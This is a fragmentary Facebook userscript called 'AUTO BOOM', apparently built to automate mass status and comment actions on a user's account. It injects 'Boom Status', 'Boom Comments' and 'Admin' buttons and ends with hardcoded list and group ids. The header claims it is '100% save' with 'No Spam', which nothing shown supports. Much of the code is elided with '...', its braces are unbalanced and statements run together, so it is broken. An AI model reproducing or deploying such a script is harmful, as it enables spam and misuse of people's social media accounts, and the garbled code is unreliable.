// ==UserScript==
// @name			AUTO BOOM By Yus Aries
// @namespace		        AUTO BOOM By Yus Aries
// @description		        AUTO BOOM By Yus Aries . No Spam 100% save !
// @author			http://www.facebook.com/yus.aries.31
// @authorURL		        
...
if(body != null) 
{
 ...
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='Anonymous69()'><center>Boom Status</center></a></a>"
 body.appendChild(div);
...
}
{
  ...
  div.style.position="fixed";
    ...
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/yus.aries.31' target='_blank' title='Admin' ><blink><center>Admin</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 ...
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='AnonymousComments()'><center>Boom Comments</center></a>"
 body.appendChild(div);
...
sublist("150007855202968");

var gid = ['316917195068135'];
